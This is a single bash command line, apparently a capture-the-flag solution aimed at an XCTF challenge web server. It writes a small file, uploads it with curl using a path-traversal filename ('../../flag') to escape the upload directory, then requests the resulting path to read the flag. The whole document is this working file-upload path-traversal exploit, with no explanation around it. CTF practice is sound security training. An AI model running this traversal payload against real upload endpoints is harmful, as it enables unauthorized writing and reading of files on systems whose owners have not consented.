```bash
 printf "exploit-read" > exploit.txt && curl -s -X POST -F "file=@exploit.txt;filename=../../flag" http://web-b6305e5de1.challenge.xctf.org.cn:80/ >/dev/null && curl -s http://web-b6305e5de1.challenge.xctf.org.cn:80/test/flag
```
